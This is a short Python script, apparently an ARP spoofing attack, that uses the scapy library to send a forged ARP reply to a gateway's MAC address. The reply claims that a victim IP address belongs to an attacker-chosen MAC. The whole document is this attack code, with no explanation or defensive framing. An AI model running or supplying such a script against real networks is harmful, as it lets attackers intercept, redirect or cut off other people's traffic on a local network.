from scapy.all import Ether, ARP, srp, send
victim_ip = "10.13.33.37"
spoofed_mac = "de:ad:be:ef:ca:fe"
gateway_mac = "7c:5a:1c:d3:d8:76"
arp_packet = Ether(dst=gateway_mac)/ARP(op="is-at", hwsrc=spoofed_mac, psrc=victim_ip)
send(arp_packet, verbose=False)
